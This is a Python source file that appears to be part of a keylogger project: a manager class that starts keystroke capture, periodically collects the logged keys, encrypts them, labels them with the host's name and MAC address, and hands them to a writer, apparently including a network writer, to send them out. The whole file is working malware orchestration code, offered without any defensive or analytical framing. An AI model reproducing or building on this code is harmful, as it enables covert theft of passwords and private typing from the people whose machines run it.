import time
from keyLoggerService import *
from fileWriter import *
from networkWriter import *
from encryptor import *
from getmac import get_mac_address
import socket


class KeyLoggerManager:
    """
    A class to manage the key logging process, including data collection, processing, and sending.

    Attributes:
        __interval (int): The interval in seconds at which data is collected.
        __machine_name (dict): A dictionary containing the machine's hostname and MAC address.
        __service (KeyLoggerService): An instance of the KeyLoggerService to handle key logging.
        __writer (Iwriter): An instance of a writer to handle data output.
    """

    def __init__(self, interval: int = 10, how_to_write: Iwriter = None):
        """
        Initialize a new KeyLoggerManager instance.

        Args:
            interval (int, optional): The interval in seconds at which data is collected. Defaults to 10.
            how_to_write (Iwriter, optional): An instance of a writer to handle data output. Defaults to None.
        """
        self.__interval = interval
        self.__machine_name = {socket.gethostname(): str(get_mac_address())}
        self.__service = KeyLoggerService()
        self.__writer: Iwriter = how_to_write

    def collect_data(self) -> None:
        """
        Start the key logging service and collect data at specified intervals.
        """
        self.__service.start_logging()
        duration = self.__interval
        while True:
            time.sleep(duration)
            if not self.__service.get_logged_keys():
                continue
            else:
                self.send_data(self.process_data(self.__service.get_logged_keys()))
                self.__service.flush()

    def process_data(self, data: List[str]) -> str:
        """
        Process the collected keystrokes by encrypting them.

        Args:
            data (List[str]): A list of logged keystrokes.

        Returns:
            str: The encrypted data.
        """
        data_str = "".join(data)
        encrypted_data1 = Encryptor().encrypt(data_str)
        return encrypted_data1

    def send_data(self, enc_data: str) -> None:
        """
        Send the encrypted data to the specified writer.

        Args:
            enc_data (str): The encrypted data to be sent.
        """
        machine_name = self.__machine_name
        self.__writer.send_data(enc_data, machine_name)
